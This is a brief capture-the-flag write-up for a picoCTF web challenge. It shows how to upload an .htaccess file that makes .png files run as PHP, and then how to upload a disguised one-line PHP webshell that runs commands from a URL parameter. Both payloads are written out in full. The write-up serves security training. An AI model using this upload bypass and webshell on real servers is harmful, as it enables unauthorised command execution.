# URL
https://play.picoctf.org/practice/challenge/518
# Concept
* file upload attack
* overwriting `.htaccess` file
# Method of solve
* we have a file upload function on the landing page
* we want to upload a malicious file with PHP code in it to get webshell code execution
* this server allows us to upload our own `.htaccess` file, which we could use to get PHP code execution on files without a PHP file extension
* we can create a malicious `.htaccess` file with the following contents:
```
AddType application/x-httpd-php .png
Options +Indexes
```
* after uploading this file we can upload a file with PHP webshell content, but have the file retain the .png file extension
* The contents of the file might look like this:
```
PNG
<?=`$_GET[0]`?>
```
* after that, we can access the png file, and it will execute PHP code with the `0` URL parameter
* the flag is in the `/var` directory


